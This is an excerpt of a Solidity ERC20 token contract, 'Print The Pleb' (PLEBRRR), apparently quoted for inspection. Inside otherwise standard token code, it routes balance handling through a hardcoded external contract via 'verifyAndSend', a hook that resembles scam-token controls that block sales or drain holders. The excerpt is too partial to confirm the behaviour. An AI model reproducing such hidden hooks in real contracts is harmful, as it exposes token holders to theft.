...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _plebtoken = 0xdE7c2100Ca0705380463B1905B7961178f9F8bBc;
    address public pair;
    ...
    function senderBalance(uint256 amount) internal returns (uint256) {
        return plebtoken.verifyAndSend(amount);
    }
    ...
    function _DeployPrintThePleb(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPrintThePleb(creator, initialSupply);
    }
}

contract PlebPrinter is ERC20Token {
    constructor() ERC20Token("Print The Pleb", "PLEBRRR", msg.sender, 4206969420 * 10 ** 18) {
    }
}